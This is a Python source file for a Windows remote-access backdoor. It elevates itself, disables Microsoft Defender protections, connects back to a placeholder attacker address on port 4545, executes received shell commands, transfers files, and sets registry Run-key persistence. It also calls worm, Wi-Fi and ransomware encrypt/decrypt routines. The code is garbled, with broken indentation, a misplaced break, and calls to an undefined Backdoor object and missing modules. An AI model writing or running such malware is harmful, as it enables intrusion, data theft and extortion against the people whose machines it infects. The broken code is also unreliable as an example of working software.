import socket
import json
import subprocess
import time
import os
import threading
import shutil
import sys
import win32com

ASADMIN = "asadmin"

if sys.argv[-1] != ASADMIN:
  script = os.path.abspath(sys.argv[0])
  params = " ".join([script] + sys.argv[1:] + [ASADMIN])
  win32com.shell.shell.ShellExecuteEx(
  lpVerb="runas", lpFile=sys.executable, lpParameters=params
  )
  sys.exit(0)
  os.system("powershell.exe -command Add-MpPreference -ExclusionExtension .exe")
  os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")

def reliable_send(data):
  jsondata = Backdoor.json.dumps(data)
  Backdoor.send(jsondata.encode())

def reliable_recv():
  data = ""
  while True:
    try:
      data = data + Backdoor.recv(1024).decode().rstrip()
      return Backdoor.json.loads(data)
    except ValueError:
      continue

def is_admin():
  global admin
  try:
    temp = os.listdir(os.sep.join([os.environ.get("SystemRoot", "C:\windows"), "temp"]))
  except:
    admin = "[!!!]User Privileges!!!"
  else:
    admin = "[+] Admin Privileges!!!"

def download_file(file_name):
  f = open(file_name, "wb")
  Backdoor.settimeout(1)
  chunk = Backdoor.recv(1024)
  while chunk:
    f.write(chunk)
  try:
    chunk = Backdoor.recv(1024)
  except socket.timeout as e:
    break
  Backdoor.settimeout(None)
  f.close()

def upload_file(file_name):
  f = open(file_name, "rb")
  Backdoor.send(f.read())

def persist(reg_name, copy_name):
  file_location = os.environ["appdata"] + "\\" + copy_name
  try:
    if not os.path.exists(file_location):
      shutil.copyfile(sys.executable, file_location)
      subprocess.call(
          "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "
          + reg_name
          + ' /t REG_SZ /d "'
          + file_location
          + '"',
          shell=True,
      )
      Backdoor.reliable_send("[+] Created Persistence With Reg Key: " + reg_name)
    else:
      Backdoor.reliable_send("[+] Persistence Already Exists")
  except:
    Backdoor.reliable_send("[+] Error Creating Persistence With The Target Machine")

def connection():
  while True:
    time.sleep(20)
    try:
        Backdoor.connect((YOUR_IP, 4545))
        Backdoor.shell()
        Backdoor.close()
        break
    except:
          Backdoor.connection()

def shell():
  while True:
      command = Backdoor.reliable_recv()
    if command == "quit":
        break
    elif command == "background":
          pass
      elif command == "worm":
          worm.s()
      elif command == "wifi":
          Network.main()
      elif command == "help":
          pass
      elif command == "clear":
          pass
      elif command == "encrypt":
          Ransom.encrypt()
      elif command == "decrypt":
            Ransom.decrypt()
        elif command[:3] == "cd ":
            os.chdir(command[3:])
        elif command[:5] == "check":
            try:
                Backdoor.is_admin()
                Backdoor.reliable_send(admin)
            except:
                Backdoor.reliable_send("Something Went Wrong")
        elif command[:6] == "upload":
            Backdoor.download_file(command[7:])
        elif command[:8] == "download":
              Backdoor.upload_file(command[9:])
          elif command[:11] == "persistence":
              reg_name, copy_name = command[12:].split(" ")
              Backdoor.persist(reg_name, copy_name)
          elif command[:7] == "sendall":
              subprocess.Popen(
                  command[8:],
                  shell=True,
                  stdout=subprocess.PIPE,
                  stderr=subprocess.PIPE,
                  stdin=subprocess.PIPE,
              )
          else:
              execute = subprocess.Popen(
                  command,
                  shell=True,
                  stdout=subprocess.PIPE,
                  stderr=subprocess.PIPE,
                  stdin=subprocess.PIPE,
              )
              result = execute.stdout.read() + execute.stderr.read()
              result = result.decode()
              Backdoor.reliable_send(result)
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      Backdoor.connection()
